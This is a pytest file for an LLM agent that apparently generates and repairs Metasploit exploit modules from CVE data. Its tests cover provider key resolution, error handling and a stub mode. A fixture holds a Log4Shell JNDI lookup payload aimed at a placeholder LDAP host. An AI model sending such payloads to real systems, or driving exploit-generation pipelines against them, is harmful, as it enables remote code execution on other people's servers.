"""Tests for Smart Agent generation, repair, and provider failures."""

from __future__ import annotations

import sys
from types import SimpleNamespace

import pytest

import zero_forge.agents.smart_agent as smart_agent
from zero_forge.agents.smart_agent import (
    LLMConfigurationError,
    LLMProviderError,
    LLMResponseError,
    _call_llm,
    _extract_code_block,
    _resolve_provider,
    generate_artifact,
    repair_artifact,
)
from zero_forge.schemas import (
    Artifact,
    ArtifactType,
    CollectedContext,
    ValidationResult,
    VulnerabilityInput,
)


def _context() -> CollectedContext:
    return CollectedContext(
        cve_id="CVE-2021-44228",
        cve_description="Log4Shell RCE",
        poc_text="${jndi:ldap://example.invalid}",
    )


def _install_litellm(monkeypatch, completion) -> None:
    monkeypatch.setitem(sys.modules, "litellm", SimpleNamespace(completion=completion))


def test_extract_code_block_ruby():
    text = "Here is the code:\n```ruby\nclass Foo\nend\n```\nDone."
    result = _extract_code_block(text)
    assert "class Foo" in result
    assert "```" not in result


def test_extract_code_block_generic():
    assert "puts 'hello'" in _extract_code_block("```\nputs 'hello'\n```")


def test_extract_code_block_no_fence():
    assert _extract_code_block("just raw code") == "just raw code"


def test_missing_credentials_fail_closed(monkeypatch):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    with pytest.raises(LLMConfigurationError) as caught:
        _call_llm("system", "user")

    assert caught.value.code == "llm_configuration_error"
    assert caught.value.provider == "none"
    assert caught.value.retryable is False


def test_explicit_stub_mode_marks_artifact(monkeypatch):
    monkeypatch.setenv("ZERO_FORGE_STUB_MODE", "true")
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    artifact = generate_artifact(
        VulnerabilityInput(cve_id="CVE-2021-44228"),
        _context(),
    )

    assert artifact.artifact_type == ArtifactType.METASPLOIT
    assert "MetasploitModule" in artifact.content
    assert artifact.metadata["stub"] is True


def test_auth_failure_is_not_replaced_by_stub(monkeypatch):
    class AuthenticationError(Exception):
        pass

    def fail(**_kwargs):
        raise AuthenticationError("bad credentials")

    monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
    _install_litellm(monkeypatch, fail)

    with pytest.raises(LLMProviderError) as caught:
        _call_llm("system", "user")

    assert caught.value.provider == "openai"
    assert caught.value.retryable is False
    assert isinstance(caught.value.__cause__, AuthenticationError)


def test_timeout_is_typed_as_retryable(monkeypatch):
    def fail(**_kwargs):
        raise TimeoutError("provider timed out")

    monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
    _install_litellm(monkeypatch, fail)

    with pytest.raises(LLMProviderError) as caught:
        _call_llm("system", "user")

    assert caught.value.provider == "openai"
    assert caught.value.retryable is True
    assert caught.value.attempt == 1
    assert caught.value.max_attempts == 1


def test_malformed_response_fails_closed(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
    _install_litellm(monkeypatch, lambda **_kwargs: SimpleNamespace(choices=[]))

    with pytest.raises(LLMResponseError) as caught:
        _call_llm("system", "user")

    assert caught.value.code == "llm_response_error"
    assert caught.value.provider == "openai"


def test_repair_artifact_uses_llm_output(monkeypatch):
    artifact = Artifact(
        artifact_type=ArtifactType.METASPLOIT,
        content="class Foo\nend",
        filename="test.rb",
    )
    validation = ValidationResult(
        is_valid=False,
        errors=["Missing required method: 'exploit'"],
    )
    monkeypatch.setattr(
        smart_agent,
        "_call_llm",
        lambda *_args: "```ruby\nclass MetasploitModule\nend\n```",
    )

    repaired = repair_artifact(artifact, validation, _context())

    assert repaired.artifact_type == ArtifactType.METASPLOIT
    assert repaired.filename == "test.rb"
    assert "MetasploitModule" in repaired.content


def test_resolve_provider_openrouter(monkeypatch):
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("ZERO_FORGE_SMART_MODEL", "meta-llama/llama-3-70b-instruct")

    api_key, model, extra = _resolve_provider()
    assert api_key == "sk-or-test"
    assert model == "openrouter/meta-llama/llama-3-70b-instruct"
    assert extra == {}


def test_resolve_provider_openrouter_already_prefixed(monkeypatch):
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.setenv("ZERO_FORGE_SMART_MODEL", "openrouter/anthropic/claude-3.5-sonnet")

    api_key, model, _ = _resolve_provider()
    assert api_key == "sk-or-test"
    assert model == "openrouter/anthropic/claude-3.5-sonnet"


def test_resolve_provider_openrouter_base_url(monkeypatch):
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test")
    monkeypatch.setenv("ZERO_FORGE_SMART_BASE_URL", "https://custom.openrouter.proxy/v1")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    api_key, _model, extra = _resolve_provider()
    assert api_key == "sk-or-test"
    assert extra["api_base"] == "https://custom.openrouter.proxy/v1"


def test_resolve_provider_openai_fallback(monkeypatch):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.setenv("OPENAI_API_KEY", "sk-openai")
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("ZERO_FORGE_SMART_MODEL", "gpt-4o")

    api_key, model, _ = _resolve_provider()
    assert api_key == "sk-openai"
    assert model == "gpt-4o"


def test_resolve_provider_anthropic(monkeypatch):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-anthropic")
    monkeypatch.setenv("ZERO_FORGE_SMART_MODEL", "claude-3.5-sonnet")

    api_key, model, _ = _resolve_provider()
    assert api_key == "sk-anthropic"
    assert model == "anthropic/claude-3.5-sonnet"


def test_resolve_provider_without_key(monkeypatch):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    api_key, _model, _ = _resolve_provider()
    assert api_key is None
